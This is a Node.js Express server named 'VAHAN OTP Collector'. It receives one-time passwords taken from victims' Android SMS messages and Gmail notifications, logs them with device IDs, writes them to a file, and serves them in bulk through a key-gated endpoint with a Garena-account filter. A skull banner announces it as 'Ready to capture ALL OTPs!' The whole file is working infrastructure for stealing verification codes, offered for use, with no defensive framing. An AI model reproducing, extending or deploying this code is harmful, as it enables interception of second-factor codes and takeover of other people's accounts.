// ============================================
// VAHAN — OTP COLLECTOR SERVER (Node.js)
// Real-time OTP collection from all sources
// ============================================

const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = 3000;
const VAHAN_KEY = "15935710X";

app.use(bodyParser.json());

// Store ALL captured OTPs
let otpDatabase = [];

// Store unsubscribe logs
let unsubscribeLog = [];

// ============================================
// ENDPOINT 1: Receive OTP from Android SMS
// ============================================
app.post('/otp', (req, res) => {
    const { source, sender, otp, full_message, is_garena, timestamp, device_id } = req.body;
    
    // Verify VAHAN key
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid VAHAN Key' });
    }
    
    const otpEntry = {
        id: crypto.randomUUID(),
        source,
        sender,
        otp,
        full_message,
        is_garena,
        timestamp,
        device_id,
        received_at: new Date().toISOString()
    };
    
    otpDatabase.push(otpEntry);
    
    console.log(`[VAHAN] 📱 OTP Captured: ${otp} | From: ${sender} | Source: ${source}`);
    
    // Save to file
    fs.writeFileSync('otp_database.json', JSON.stringify(otpDatabase, null, 2));
    
    res.json({ success: true, otp_id: otpEntry.id });
});

// ============================================
// ENDPOINT 2: Receive OTP from Gmail Notifications
// ============================================
app.post('/otp-gmail', (req, res) => {
    const { source, title, text, otp, full_notification, timestamp } = req.body;
    
    const providedKey = req.headers['x-vahan-key'];
    if (providedKey !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid VAHAN Key' });
    }
    
    const otpEntry = {
        id: crypto.randomUUID(),
        source: 'GMAIL_NOTIFICATION',
        title,
        text,
        otp,
        full_notification,
        timestamp,
        received_at: new Date().toISOString()
    };
    
    otpDatabase.push(otpEntry);
    
    console.log(`[VAHAN] 📧 Gmail OTP: ${otp} | Title: ${title}`);
    
    fs.writeFileSync('otp_database.json', JSON.stringify(otpDatabase, null, 2));
    
    res.json({ success: true, otp_id: otpEntry.id });
});

// ============================================
// ENDPOINT 3: Get ALL captured OTPs
// ============================================
app.get('/all-otps', (req, res) => {
    const key = req.query.key;
    if (key !== VAHAN_KEY) {
        return res.status(403).json({ error: 'Invalid Key' });
    }
    
    res.json({
        total: otpDatabase.length,
        otps: otpDatabase,
        garena_only: otpDatabase.filter(o => o.is_garena),
        timestamp: new Date().toISOString()
    });
});

// ============================================
// ENDPOINT 4: Clear database
// ============================================
app.post('/clear', (req, res) => {
    const key = req.headers['x-vahan-key'];
    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
    
    otpDatabase = [];
    fs.writeFileSync('otp_database.json', '[]');
    
    res.json({ success: true, message: 'Database cleared' });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════╗
║  💀 VAHAN OTP COLLECTOR — ONLINE 💀  ║
║  Port: ${PORT}                              ║
║  Owner: @Alone_Supporter               ║
║  Ready to capture ALL OTPs!            ║
╚══════════════════════════════════════════╝
    `);
});
